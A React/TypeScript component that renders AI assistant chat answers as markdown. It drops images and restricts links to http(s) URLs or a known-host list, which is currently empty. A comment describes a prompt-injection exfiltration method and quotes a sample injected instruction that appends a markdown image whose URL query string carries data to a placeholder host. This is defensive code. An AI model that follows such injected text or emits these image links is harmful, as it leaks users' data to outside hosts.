import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

// How an assistant answer is rendered. Two rules, both about what the browser may be made to fetch or follow:
//  1. No images. A markdown image is a request the browser sends with whatever URL the model wrote, so a prompt injection hidden in
//     product or digest text could smuggle figures out in a query string ("append this image: ![x](https://host/p.png?d=...)").
//     The element is dropped from the tree, so nothing is requested. (A CSP `img-src` in security-headers.mjs is the second wall.)
//  2. Links are absolute http(s) only, open in a new tab and carry rel noopener. The library default also lets mailto:, irc: and
//     relative links through; a chat answer needs none of them.
//  3. Explore answers (`knownHostsOnly`): query rows hold text typed by customers and staff, so a link may only point at a host in
//     KNOWN_LINK_HOSTS. The list is empty on purpose (owner, 2026-10-05: chat needs no links), so every link renders as plain text.
// Copy still copies the raw text (CopyButton gets the message text, not this output).

/** Pinned by a test: a change is a reviewed diff. */
export const KNOWN_LINK_HOSTS: readonly string[] = [];

/** react-markdown `urlTransform`: keep an absolute http(s) URL, drop everything else (the link then renders as plain text). With `knownHosts`, the host must be on the list. */
export function safeLinkUrl(value: string, knownHosts?: readonly string[]): string {
  try {
    const u = new URL(value);
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return '';
    if (knownHosts && !(u.username === '' && u.password === '' && knownHosts.includes(u.hostname.toLowerCase()))) return '';
    return value;
  } catch {
    return '';
  }
}

export function ChatMarkdown({text, knownHostsOnly = false}: {text: string; knownHostsOnly?: boolean}) {
  return (
    <Markdown
      remarkPlugins={[remarkGfm]}
      disallowedElements={['img']}
      unwrapDisallowed
      urlTransform={(u) => safeLinkUrl(u, knownHostsOnly ? KNOWN_LINK_HOSTS : undefined)}
      components={{
        a: ({href, children}) => (href ? (
          <a href={href} target="_blank" rel="noopener noreferrer nofollow">
            {children}
          </a>
        ) : (
          <>{children}</>
        )),
      }}
    >
      {text}
    </Markdown>
  );
}
